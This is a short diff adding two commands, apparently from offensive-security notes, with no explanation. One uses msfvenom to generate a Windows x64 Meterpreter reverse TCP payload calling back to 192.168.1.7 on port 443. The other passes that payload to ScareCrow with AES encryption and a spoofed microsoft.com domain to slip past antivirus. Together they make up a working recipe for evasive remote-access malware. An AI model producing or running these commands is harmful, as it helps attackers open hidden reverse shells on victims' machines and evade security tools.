@@ -1,0 +1,3 @@
+./ScareCrow -I av.bin -domain www.microsoft.com -encryptionmode AES
+
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.7 LPORT=443 -f raw -o av.bin
